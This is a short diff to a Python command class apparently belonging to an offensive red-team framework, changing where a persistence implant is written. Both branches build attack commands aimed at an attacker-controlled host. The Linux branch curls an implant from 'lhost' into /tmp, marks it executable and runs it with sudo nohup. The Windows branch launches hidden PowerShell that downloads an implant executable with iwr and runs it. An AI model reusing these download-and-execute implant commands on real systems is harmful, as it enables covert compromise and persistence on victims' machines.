@@ -1235,7 +1235,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         lhost = self.params['lhost']
         implant_go2 = f"l_{line}_l.exe"
         if choice == "2":
-            command = f"curl -o /home/grisun0/l_{line} http://{self.params['lhost']}/l_{line} && sudo -S chmod +x /home/grisun0/l_{line} && sudo -S nohup /home/grisun0/l_{line} & \\n"
+            command = f"curl -o /tmp/l_{line} http://{self.params['lhost']}/l_{line} && sudo -S chmod +x /tmp/l_{line} && sudo -S nohup /tmp/l_{line} & \\n"
         else:
             command = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{self.params['lhost']}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\""
 
